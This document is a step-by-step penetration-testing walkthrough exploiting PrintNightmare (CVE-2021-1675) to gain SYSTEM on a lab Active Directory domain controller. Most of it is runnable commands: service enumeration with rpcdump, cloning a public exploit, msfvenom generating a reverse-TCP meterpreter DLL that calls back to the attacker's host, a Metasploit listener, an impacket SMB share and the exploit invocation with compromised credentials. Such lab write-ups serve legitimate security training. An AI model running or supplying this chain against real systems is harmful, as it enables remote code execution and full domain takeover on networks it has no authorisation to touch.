# Active Directory - Print Nightmare

### Post Compromise Attacks

By: **CyberSec**

**RCE Exploit:** [https://github.com/cube0x0/CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675)

In this documentation, we explore print nightmare. Printnightmare is a vulnerability which affects the Microsoft Windows Print Spooler Service. It has the potential to enable attackers to gain complete control of an affected system. If the Print Spooler service is running on a Domain Controller, an attacker could insert malicious DLLs into a remote Windows host, whereby a regular domain user can execute code as SYSTEM on the Domain Controller.

We will walk through the steps of exploiting this vulnerability using a domain joined machine, a domain controller and an attacking machine as illustrated below.

### Domain Setup:

In this example, we have a domain controller (DC01) running the print spooler service and a Client Computer (Client1) in the CSL.local domain.

**Client1:** `192.168.0.31`

**DC01:** `192.168.0.21`

**ATTACKER:** `192.168.0.23`

### **Scenario:**

We have managed to compromise a user account (`fcastle` with password: `Passwor01`) within a windows domain (CSL.local).  The user has low level privileges.  However, further enumeration in this particular assessment confirms that the domain controller is running the print spooler service. A a penetration tester, we can take advantage of this vulnerability to gain super privileges on the domain controller and pwned the entire domain. 

From there, we would be able to demonstrate how an attacker can maintain domain persistence using other attacks such as *(Golden Ticket, Silver Ticker, Skeleton Key, DSRM, Custom SSP, AdminSDHolder,DCSync,DCShadow, etc.).* 

The focus of this write up is to first demonstrate domain compromise through print nightmare. 

Below is an illustrated example that supplements the described scenario.

![Untitled](./ActiveDirectory/printnightmare/Active%20Directory%20-%20Print%20Nightmare%20084f7383b7df40aaad8334c442f0d105/Untitled.png)

![Untitled](./ActiveDirectory/printnightmare/Active%20Directory%20-%20Print%20Nightmare%20084f7383b7df40aaad8334c442f0d105/Untitled%201.png)

![Untitled](./ActiveDirectory/printnightmare/Active%20Directory%20-%20Print%20Nightmare%20084f7383b7df40aaad8334c442f0d105/Untitled%202.png)

The methodology used to successfully pull of this attack are as follows:

1. Enumerate the domain controller for the vulnerable service
2. Download the RCE exploit from Github
3. Create a Malicious DLL
4. Start a Listener (Multi-Handler) to listen for reverse connection 
5. Host a temporary fileshare on the attackers machine (with exploit and DLL)
6. Execute the exploit and call the DLL

### Enumerate the domain controller for the vulnerable service

On our attacking machine, we will run the [rpcdump.py](http://rpcdump.py) tool to help enumerate the existence of the service running on the domain controller with the below command:

```bash
rpcdump.py @192.168.0.21 | egrep 'MS-RPRN|MS-PAR'
```

![Untitled](./ActiveDirectory/printnightmare/Active%20Directory%20-%20Print%20Nightmare%20084f7383b7df40aaad8334c442f0d105/Untitled%203.png)

The above confirms that the target is vulnerable to the attack.

### Download the RCE exploit from Github

```bash
git clone https://github.com/cube0x0/CVE-2021-1675.git
```

![Untitled](./ActiveDirectory/printnightmare/Active%20Directory%20-%20Print%20Nightmare%20084f7383b7df40aaad8334c442f0d105/Untitled%204.png)

### Create a Malicious DLL

Inside of the exploit folder we will create a malicious DLL with msfvenom. See below for commands.

**Command:** 

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.23 LPORT=53 -f dll > printshell.dll
```

![Untitled](./ActiveDirectory/printnightmare/Active%20Directory%20-%20Print%20Nightmare%20084f7383b7df40aaad8334c442f0d105/Untitled%205.png)

### Start a Listener (Multi-Handler) to listen for reverse connection

```bash
use /exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.0.23
set lport 53
run
```

![Untitled](./ActiveDirectory/printnightmare/Active%20Directory%20-%20Print%20Nightmare%20084f7383b7df40aaad8334c442f0d105/Untitled%206.png)

### Host a temporary fileshare on the attackers machine

(with exploit and DLL)

Using the impacket-smbserver tool on Kali Linux, we will setup a temporary fileshare.

```bash
impacket-smbserver fileshare ./
```

![Untitled](./ActiveDirectory/printnightmare/Active%20Directory%20-%20Print%20Nightmare%20084f7383b7df40aaad8334c442f0d105/Untitled%207.png)

We can test to see if the file share is accessible from client 1.

**Command:** 

```bash
dir \\192.168.0.23\fileshare\
```

If the following error is shown, it means that smb2 is enabled.

![Untitled](./ActiveDirectory/printnightmare/Active%20Directory%20-%20Print%20Nightmare%20084f7383b7df40aaad8334c442f0d105/Untitled%208.png)

To get around this issue with impacket-smbserver - we will update our command to support smb2.

**Command:**

```bash
impacket-smbserver fileshare ./ -smb2support
```

![Untitled](./ActiveDirectory/printnightmare/Active%20Directory%20-%20Print%20Nightmare%20084f7383b7df40aaad8334c442f0d105/Untitled%209.png)

Again, we can confirm access to the share from the windows client by re-issuing the commands from the windows client.

```bash
dir \\192.168.0.23\fileshare\
```

![Untitled](./ActiveDirectory/printnightmare/Active%20Directory%20-%20Print%20Nightmare%20084f7383b7df40aaad8334c442f0d105/Untitled%2010.png)

We can see that we can now access the fileshare hosted from out attckers machine.

### Execute the exploit and call the malicious DLL

**Syntax:**

Command: 

```bash
python3  CVE-2021-1675.py <domain name>/<username>:<Password>@192.168.0.21 ‘\\<IP of Kali Share>\printshell.dll’
```

```bash
python3  CVE-2021-1675.py csl/fcastle:Password01@192.168.0.21 '\\192.168.0.23\fileshare\printshell.dll'
```

Command explanation: 

[`CVE-2021-1675.py](http://CVE-2021-1675.py) is the exploit`

`csl/fcastle:Password01 is the user credentials`

`@192.168.0.21 is the domain controller’s IP address`

`\\192.168.0.23\fileshare\printshell.dll is the fileshare hosting our malicious DLL`

![Untitled](./ActiveDirectory/printnightmare/Active%20Directory%20-%20Print%20Nightmare%20084f7383b7df40aaad8334c442f0d105/Untitled%2011.png)

In our metasploit console, we were able to get a meterpreter shell onto the Domain Controller as super user - `nt authority\system`

![Untitled](./ActiveDirectory/printnightmare/Active%20Directory%20-%20Print%20Nightmare%20084f7383b7df40aaad8334c442f0d105/Untitled%2012.png)

### Explanation

After executing our exploit (as shown in 1), the exploit authenticated to the domain controller with the credentials provided in our command and the domain controller connects to the fileshare hosted on the Kali Linux machine (as shown in 2) and triggered our malicious DLL. A remote session is created back to our reverse handler metasploit multi-handler, granting us a meterpreter session on the domain controller as super admin.